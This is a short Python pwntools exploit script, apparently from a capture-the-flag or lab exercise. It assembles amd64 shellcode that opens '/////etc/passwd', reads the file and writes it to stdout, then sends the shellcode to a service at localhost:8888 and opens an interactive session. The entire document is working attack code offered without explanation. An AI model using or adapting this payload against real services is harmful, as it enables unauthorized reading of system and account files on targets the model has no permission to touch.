from pwn import *
import pwnlib
import binascii
context.arch = 'amd64'
a= asm('''
	filename:
		mov rcx, 0x006477737361702f  
		push rcx
		mov rcx, 0x6374652f2f2f2f2f   
		push rcx

	openfile:
		mov rdi, rsp
		mov rax, 2
		mov rsi, 0
		syscall

	readfile:
		mov rsi, rsp
		mov rdi, rax
		mov dx, 0x999
		xor rax, rax
		syscall

	writefile:
		mov rdi, 1
		mov rdx, rax
		mov rax, 1
		syscall

	normal_exit:
		mov rax, 60
		syscall
	''')
r = remote('localhost',8888)
r.send(a)
r.interactive()	